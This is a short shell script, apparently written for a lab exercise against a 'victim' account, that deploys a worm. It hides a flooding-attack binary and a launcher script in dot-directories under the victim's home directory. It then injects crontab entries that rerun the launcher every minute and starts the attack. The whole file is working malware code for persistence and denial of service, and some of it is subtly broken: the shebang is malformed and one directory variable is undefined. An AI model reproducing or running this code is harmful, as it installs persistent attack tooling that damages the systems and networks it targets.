#/bin/sh

inject_crontab() {
  echo "Injecting Crontab..."
  local crontab_command1='* * * * * [ -f /home/victim/.Launch_Attack/launching_attack.sh ] && /home/victim/.Launch_Attack/launching_attack.sh'
  local crontab_command2='* * * * * [ -f /home/victim/.Attack_Launch/launching_attack.sh ] && /home/victim/.Attack_Launch/launching_attack.sh'
  crontab -l > /tmp/tmp_cron
  cat /tmp/tmp_cron | grep -Fxq "$crontab_command1"
  if [ $? -eq 0 ]; then # positive match
    echo "Crontab Command1 Already Injected!"
  else
    echo "$crontab_command1" >> /tmp/tmp_cron
    crontab /tmp/tmp_cron
    echo "Crontab Command1 Inject Finished!"
  fi
  cat /tmp/tmp_cron | grep -Fxq "$crontab_command2"
  if [ $? -eq 0 ]; then # positive match
    echo "Crontab Command2 Already Injected!"
  else
    echo "$crontab_command2" >> /tmp/tmp_cron
    crontab /tmp/tmp_cron
    echo "Crontab Command2 Inject Finished!"
  fi
  rm /tmp/tmp_cron
}

main() {
  echo "Launching Worm..."
  local home_dir="/home/victim"
  local launch_dir1=".Launch_Attack"
  local launch_dir2=".Attack_Launch"
  local dir01=".etc"
  local dir02=".var"
  local module_dir=".module"
  local launch_file="launching_attack.sh"
  local flooding_file="flooding_attack"
  mkdir -p "$home_dir/$launch_dir"
  mkdir -p "$home_dir/$dir01/$module_dir"
  mkdir -p "$home_dir/$dir02/$module_dir"
  cp "$PWD/b" "$flooding_file" # reuse the provided file
  cp "$PWD/$launch_file" "$home_dir/$launch_dir1"
  cp "$PWD/$launch_file" "$home_dir/$launch_dir2"
  cp "$PWD/$flooding_file" "$home_dir/$dir01/$module_dir"
  cp "$PWD/$flooding_file" "$home_dir/$dir02/$module_dir"
  inject_crontab
  $home_dir/$launch_dir/$launch_file # launch attack!
  echo "Worms Deploy Finished!"
}
main
